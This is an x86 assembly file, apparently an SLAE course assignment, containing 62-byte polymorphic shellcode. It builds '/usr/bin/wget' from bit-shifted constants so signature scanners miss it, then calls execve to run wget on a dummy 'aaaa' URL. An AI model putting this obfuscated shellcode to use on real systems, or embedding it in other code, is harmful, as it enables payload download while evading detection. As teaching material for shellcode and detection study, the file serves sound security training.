; Author :      Demey Alexandre (PA-14186)
; Date :        11-05-2020
; 
; Description : SLAE assignment #6 - Polymorphic shellcodes
;
; Size : 62 bytes

global _start
section .text

_start:

    xor     eax, eax
    mul     eax			; EDX, EAX set to 0
    push    eax			; string terminator
    push    0x61616161		; "aaaa" wget url argument
    mov     al, 0xb		; execve syscall
    lea     ecx, [esp]		; ECX point to "aaaa"

    push    0x74		; t
    mov     ebx, 0xcaceee5e
    shr     ebx, 1		; shift one byte to the right
    push    ebx			; egw/
    mov     ebx, 0xdcd2c45e
    shr     ebx, 1		; shift one byte to the right
    push    ebx			; nib/
    mov     ebx, 0xe4e6ea5e
    shr     ebx, 1		; shift one byte to the right
    push    ebx			; rsu/
    lea     ebx, [esp]		; EBX point to "/usr/bin/wget"

    mov     [esp-4], edx	; "push" null
    mov     [esp-8], ecx	; "push" pointer on wget url argument
    mov     [esp-12], ebx	; "push" pointer to wget command
    lea     ecx, [esp-12]	; ECX point to *args
    int     0x80		; exec execve("/usr/bin/wget", ["/usr/bin/wget","aaaa"],null)


